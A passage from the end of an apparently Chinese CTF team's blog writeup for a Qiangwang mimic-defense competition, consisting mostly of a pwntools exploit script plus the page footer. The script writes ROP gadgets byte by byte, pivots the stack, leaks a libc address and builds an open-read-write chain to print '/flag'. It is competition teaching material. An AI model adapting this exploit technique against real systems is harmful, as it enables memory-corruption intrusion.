class="string">&#x27;&lt;Q&#x27;</span>, input_addr)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;1#10ff&#x27;</span> + ret_b.<span class="built_in">hex</span>()[:-<span class="number">4</span>])</span><br><span class="line">sla(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;1#21&#x27;</span> +<span class="string">&#x27;00&#x27;</span>*<span class="number">2</span> + rdi_b.<span class="built_in">hex</span>()[:-<span class="number">6</span>])</span><br><span class="line">sla(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;1#22&#x27;</span> + rdi_b.<span class="built_in">hex</span>()[<span class="number">10</span>:-<span class="number">4</span>] + <span class="string">&#x27;00&#x27;</span>*<span class="number">2</span> + fgets_b.<span class="built_in">hex</span>()[:-<span class="number">8</span>])</span><br><span class="line">sla(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;1#23&#x27;</span> + fgets_b.<span class="built_in">hex</span>()[<span class="number">8</span>:-<span class="number">4</span>] + <span class="string">&#x27;00&#x27;</span>*<span class="number">2</span> + puts_p.<span class="built_in">hex</span>()[:-<span class="number">10</span>])</span><br><span class="line">sla(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;1#24&#x27;</span> + puts_b.<span class="built_in">hex</span>()[<span class="number">6</span>:-<span class="number">4</span>] + <span class="string">&#x27;00&#x27;</span>*<span class="number">2</span> + pop_rbp.<span class="built_in">hex</span>()[:-<span class="number">12</span>])</span><br><span class="line">sla(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;1#25&#x27;</span> + pop_rbp.<span class="built_in">hex</span>()[<span class="number">4</span>:-<span class="number">4</span>] + <span class="string">&#x27;00&#x27;</span>*<span class="number">2</span> + input_addr.<span class="built_in">hex</span>()[:-<span class="number">14</span>])</span><br><span class="line">sla(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;1#26&#x27;</span> + input_addr.<span class="built_in">hex</span>()[<span class="number">2</span>:-<span class="number">4</span>] + <span class="string">&#x27;00&#x27;</span>*<span class="number">2</span>)</span><br><span class="line">sla(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;1#27&#x27;</span> + main_b.<span class="built_in">hex</span>()[:-<span class="number">4</span>] + <span class="string">&#x27;00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;1#28&#x27;</span> + <span class="string">&#x27;00&#x27;</span> + <span class="string">&#x27;454545454545&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;1#2945454545454545&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;1#2a45454545454545&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;1#2b45454545454545&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;1#2c45454545454545&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;1#2d45454545454545&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;1#2e45454545454545&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;1#2f45454545454545&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;1#2146464646464646&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;1#2246464646464646&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;1#2346464646464646&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;1#2446464646464646&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;1#2546464646464646&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;1#2646464646464646&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;1#2746464646464646&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;1#2846464646464646&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;1#2946464646464646&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;1#2a46464646464646&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;1#2b46464646464646&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;1#2c46464646464646&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;1#2d46464646464646&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;1#2e46464646464646&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;1#2f46464646464646&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;1#2147474747474747&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;1#2247474747474747&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;1#2347474747474747&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;1#2447474747474747&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;1#2547474747474747&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;1#264747474747&#x27;</span>)</span><br><span class="line"></span><br><span class="line">gad = pie_base + <span class="number">0x00000000000012d3</span> <span class="comment">#  push rdi ; pop rsp ; ret</span></span><br><span class="line">gadge = struct.pack(<span class="string">&#x27;&lt;Q&#x27;</span>, gad)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 后续是 p__puts_w </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># debug(commend)</span></span><br><span class="line">sla(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;1#27&#x27;</span> + gadge.<span class="built_in">hex</span>()[:-<span class="number">4</span>])</span><br><span class="line">fgets_addr = uu64(rl()[<span class="number">1</span>:-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">libc_base = fgets_addr - libc.sym[<span class="string">&#x27;fgets&#x27;</span>]</span><br><span class="line">libc.address = libc_base</span><br><span class="line">leak(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">o = libc.sym[<span class="string">&#x27;open&#x27;</span>] </span><br><span class="line">r = libc.sym[<span class="string">&#x27;read&#x27;</span>] </span><br><span class="line">w = libc.sym[<span class="string">&#x27;write&#x27;</span>] </span><br><span class="line"></span><br><span class="line">rsi = pie_base + <span class="number">0x0000000000001555</span></span><br><span class="line">ret = pie_base + <span class="number">0x000000000000101a</span></span><br><span class="line">rbx = libc_os(<span class="number">0x00000000000586e4</span>) <span class="comment">#  pop rbx ; ret</span></span><br><span class="line">rdx = libc_os(<span class="number">0x00000000000b0133</span>) <span class="comment">#  mov rdx, rbx ; pop rbx ; pop r12 ; pop rbp ; ret</span></span><br><span class="line"></span><br><span class="line">payload = p64(ret) *<span class="number">2</span></span><br><span class="line">payload += flat(</span><br><span class="line">    rdi,pie_base + <span class="number">0x6188</span>,rsi,<span class="number">0</span>,<span class="number">0</span>,o,</span><br><span class="line">    rdi,<span class="number">3</span>,rsi,pie_base + <span class="number">0x6288</span>,<span class="number">0</span>,rbx,<span class="number">0x100</span>,rdx,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,r,</span><br><span class="line">    rdi,<span class="number">1</span>,rsi,pie_base + <span class="number">0x6288</span>,<span class="number">0</span>,rbx,<span class="number">0x100</span>,rdx,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,w</span><br><span class="line">)</span><br><span class="line">payload += <span class="string">b&#x27;/flag\x00\x00\x00&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x200</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>
</div><div class="article-licensing box"><div class="licensing-title"><p>第八届“强网”拟态防御国际精英挑战赛 SU Writeup</p><p><a href="https://team-su.github.io/posts/29a7c1c3.html">https://team-su.github.io/posts/29a7c1c3.html</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>Author</h6><p>SUers</p></div></div><div class="level-item is-narrow"><div><h6>Posted on</h6><p>2025-10-27</p></div></div><div class="level-item is-narrow"><div><h6>Updated on</h6><p>2025-10-28</p></div></div><div class="level-item is-narrow"><div><h6>Licensed under</h6><p><a class="icons" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="icon fab fa-creative-commons"></i></a><a class="icons" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="icon fab fa-creative-commons-by"></i></a><a class="icons" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="icon fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="article-tags is-size-7 mb-4"><span class="mr-2">#</span><a class="link-muted mr-2" rel="tag" href="/tags/%E6%8B%9F%E6%80%81/">拟态</a></div><!--!--></article></div><!--!--><nav class="post-navigation mt-4 level is-mobile"><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/posts/dccfac6f.html"><span class="level-item">2025 QWB-S9 SU WriteUp</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><!--!--></div><!--!--><div class="column column-right  order-3 is-sticky"><!--!--></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/SU4.jpg" alt="su-team" height="28"></a><p class="is-size-7"><span>&copy; 2025 SUers</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p><p class="is-size-7">© 2016</p></div><div class="level-end"></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("en");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script data-pjax src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="Back to top" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script data-pjax src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
      window.cookieconsent.initialise({
        type: "info",
        theme: "edgeless",
        static: false,
        position: "bottom-left",
        content: {
          message: "This website uses cookies to improve your experience.",
          dismiss: "Got it!",
          allow: "Allow cookies",
          deny: "Decline",
          link: "Learn more",
          policy: "Cookie Policy",
          href: "https://www.cookiesandyou.com/",
        },
        palette: {
          popup: {
            background: "#edeff5",
            text: "#838391"
          },
          button: {
            background: "#4b81e8"
          },
        },
      });
    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><script type="text/javascript" id="MathJax-script" async>MathJax = {
      tex: {
        inlineMath: [['$', '$'], ['\\(', '\\)']]
      },
      svg: {
        fontCache: 'global'
      },
      chtml: {
        matchFontHeight: false
      }
    };</script><script src="https://cdn.jsdelivr.net/npm/mathjax@3.2.2/es5/tex-mml-chtml.js"></script><!--!--><!--!--><!--!--><script data-pjax src="/js/main.js" defer></script><!--!--></body></html>